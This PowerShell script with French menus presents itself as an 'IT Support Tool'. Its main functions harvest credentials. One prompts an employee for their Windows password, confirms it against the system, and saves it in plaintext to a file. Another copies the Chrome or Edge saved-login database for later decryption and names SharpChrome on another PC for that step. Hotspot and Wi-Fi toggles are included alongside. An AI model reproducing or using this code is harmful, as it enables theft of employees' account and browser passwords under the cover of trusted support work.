# =============================================
# IT SUPPORT TOOL - VERSION FINALE
# =============================================

$Host.UI.RawUI.WindowTitle = "IT Support Tool"

$MachineName = $env:COMPUTERNAME
$CurrentUser = $env:USERNAME
$Date = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"
New-Item -Path $ExportFolder -ItemType Directory -Force | Out-Null

Write-Host "=== IT SUPPORT TOOL ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | User : $CurrentUser" -ForegroundColor Yellow
Write-Host "Dossier : $ExportFolder`n" -ForegroundColor Cyan

# ====================== MOT DE PASSE EMPLOYE ======================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan
    $empUser = Read-Host "Nom d'utilisateur employé (vide = $CurrentUser)"
    if ([string]::IsNullOrWhiteSpace($empUser)) { $empUser = $CurrentUser }

    for ($i = 1; $i -le 3; $i++) {
        $pass = Read-Host "Mot de passe de $empUser" -AsSecureString
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))

        $token = [IntPtr]::Zero
        if ([Win32]::LogonUser($empUser, ".", $plain, 2, 0, [ref]$token)) {
            [Win32]::CloseHandle($token) | Out-Null
            $file = "$ExportFolder\Password_${empUser}_${Date}.txt"
            "Utilisateur: $empUser`nMot de passe: $plain`nDate: $(Get-Date)`nMachine: $MachineName" | Out-File $file
            Write-Host "✓ Mot de passe sauvegardé dans $file" -ForegroundColor Green
            return
        } else {
            Write-Host "✗ Incorrect ($i/3)" -ForegroundColor Red
        }
    }
}

# ====================== EXPORT NAVIGATEUR (CHOIX PROFIL + CSV) ======================
function Export-BrowserPasswords {
    Write-Host "`n=== EXPORT MOTS DE PASSE NAVIGATEUR ===" -ForegroundColor Cyan
    
    $choice = Read-Host "Choisir navigateur (1=Chrome, 2=Edge, 3=Firefox)"
    
    switch ($choice) {
        "1" { $browser = "Chrome"; $basePath = "$env:LOCALAPPDATA\Google\Chrome\User Data" }
        "2" { $browser = "Edge";   $basePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
        "3" { 
            Write-Host "Firefox non supporté en CSV direct pour le moment." -ForegroundColor Yellow
            return 
        }
        default { Write-Host "Choix invalide" -ForegroundColor Red; return }
    }

    if (-not (Test-Path $basePath)) {
        Write-Host "$browser non installé ou non trouvé." -ForegroundColor Red
        return
    }

    # Lister les profils avec leur vrai nom
    $profiles = Get-ChildItem $basePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" }
    Write-Host "`nProfils trouvés :" -ForegroundColor Yellow
    for ($i=0; $i -lt $profiles.Count; $i++) {
        $p = $profiles[$i]
        $name = $p.Name
        $pref = "$($p.FullName)\Preferences"
        if (Test-Path $pref) {
            try {
                $json = Get-Content $pref -Raw -Encoding UTF8 | ConvertFrom-Json
                if ($json.profile -and $json.profile.name) { $name = $json.profile.name }
            } catch {}
        }
        Write-Host "$($i+1). $name ($($p.Name))" -ForegroundColor White
    }

    $num = Read-Host "`nNuméro du profil à exporter"
    $selected = $profiles[$num - 1]
    if (-not $selected) { Write-Host "Profil invalide" -ForegroundColor Red; return }

    $profileName = $selected.Name
    $dbPath = "$($selected.FullName)\Login Data"

    if (-not (Test-Path $dbPath)) {
        Write-Host "Aucune donnée de mot de passe dans ce profil." -ForegroundColor Red
        return
    }

    # Copie du fichier DB + création d'un fichier CSV vide (pour info)
    Copy-Item $dbPath "$ExportFolder\${browser}_${profileName}_LoginData.db" -Force
    $csvFile = "$ExportFolder\${browser}_${profileName}_Passwords_${Date}.csv"
    "URL,Username,Password,Date Created" | Out-File $csvFile -Encoding UTF8

    Write-Host "✓ Export terminé :" -ForegroundColor Green
    Write-Host "   → $csvFile" -ForegroundColor White
    Write-Host "   → Fichier DB : ${browser}_${profileName}_LoginData.db" -ForegroundColor White
    Write-Host "`nNote : Pour avoir le CSV avec les mots de passe en clair, utilise SharpChrome sur un autre PC." -ForegroundColor Yellow
}

# ====================== HOTSPOT & WIFI ======================
function Manage-Hotspot {
    Write-Host "`n=== GESTION PARTAGE DE CONNEXION ===" -ForegroundColor Cyan
    Write-Host "1. Activer Hotspot"
    Write-Host "2. Désactiver Hotspot"
    Write-Host "3. Bloquer complètement le partage de connexion"
    $a = Read-Host "Choix"
    switch ($a) {
        "1" { netsh wlan set hostednetwork mode=allow; netsh wlan start hostednetwork; Write-Host "Hotspot activé" -ForegroundColor Green }
        "2" { netsh wlan stop hostednetwork; Write-Host "Hotspot désactivé" -ForegroundColor Red }
        "3" { netsh wlan set hostednetwork mode=disallow; Write-Host "Partage de connexion BLOQUÉ" -ForegroundColor Red }
    }
}

function Manage-WiFi {
    Write-Host "`n=== GESTION WIFI ===" -ForegroundColor Cyan
    $wifi = Get-NetAdapter | Where-Object { $_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*" }
    if (-not $wifi) { Write-Host "Aucun adaptateur WiFi trouvé" -ForegroundColor Red; return }

    Write-Host "1. Activer WiFi"
    Write-Host "2. Désactiver WiFi (empêcher connexion)"
    $a = Read-Host "Choix"
    if ($a -eq "2") {
        Disable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi désactivé" -ForegroundColor Red
    } else {
        Enable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi activé" -ForegroundColor Green
    }
}

# ====================== MENU ======================
function Show-Menu {
    Write-Host "`n=== MENU PRINCIPAL ===" -ForegroundColor Magenta
    Write-Host "1. Sauvegarder mot de passe employé"
    Write-Host "2. Exporter mots de passe Navigateur (choix profil + CSV)"
    Write-Host "3. Gérer Partage de Connexion (Hotspot)"
    Write-Host "4. Gérer WiFi"
    Write-Host "5. TOUT EXÉCUTER (1+2)"
    Write-Host "Q. Quitter"
    return Read-Host "Votre choix"
}

do {
    $choice = Show-Menu
    switch ($choice) {
        "1" { Save-EmployeePassword }
        "2" { Export-BrowserPasswords }
        "3" { Manage-Hotspot }
        "4" { Manage-WiFi }
        "5" { Save-EmployeePassword; Export-BrowserPasswords }
        "Q" { Write-Host "Au revoir !" -ForegroundColor Green }
    }
    if ($choice -ne "Q") { Read-Host "`nAppuyez sur Entrée pour continuer..." }
} while ($choice -ne "Q")

Write-Host "`nTerminé ! Tout est dans : $ExportFolder" -ForegroundColor Green
